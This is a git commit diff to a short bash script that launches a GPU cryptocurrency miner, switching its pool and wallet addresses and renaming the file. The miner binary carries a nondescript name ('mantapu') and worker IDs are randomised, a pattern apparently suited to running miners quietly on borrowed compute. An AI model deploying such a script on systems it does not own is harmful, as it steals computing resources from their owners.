43e0015a7f9e12ce51837b2cc724741e98f8c8f6
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-07-26 21:07:10 +0700

    Update and rename gpu-nvidia.sh to gepu-bujil.sh

--- gepu-bujil.sh
+++ gepu-bujil.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=daggerhashimoto.eu-north.nicehash.com:3353
-WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xroc3
+POOL=eu.ezil.me:5555
+WALLET=0xae4fa9f4582afc88f329b862738c8c50e5268fba.zil12puphypaqtqazflf6q32daf4tpgm3g076ceqnn.EroZ
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 chmod +x mantapu
 ./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
